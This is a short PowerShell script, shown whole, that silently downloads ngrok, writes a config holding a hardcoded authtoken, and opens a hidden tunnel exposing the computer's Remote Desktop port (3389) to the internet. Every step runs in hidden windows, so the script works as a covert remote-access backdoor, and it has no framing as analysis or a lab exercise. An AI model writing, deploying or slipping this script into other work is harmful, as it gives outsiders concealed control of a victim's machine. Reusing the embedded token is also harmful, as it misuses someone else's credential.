Start-Process powershell -WindowStyle Hidden -ArgumentList {
    $ngrokPath = "$env:APPDATA\ngrok\ngrok.exe"
    $configPath = "$env:APPDATA\ngrok\ngrok.yml"

    if (!(Test-Path $ngrokPath)) {
        Invoke-WebRequest -Uri "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip" -OutFile "$env:TEMP\ngrok.zip"
        Expand-Archive "$env:TEMP\ngrok.zip" -DestinationPath "$env:APPDATA\ngrok"
    }

    if (!(Test-Path $configPath)) {
        @"
authtoken: 2xe3OPcwxui4icUAn8vBgxysHzH_6ceP3DS71bZm5mRxktwua
tunnels:
  rdp:
    addr: 3389
    proto: tcp
"@ | Out-File -Encoding ASCII $configPath
    }

    Start-Process -WindowStyle Hidden -FilePath $ngrokPath -ArgumentList "start rdp"
}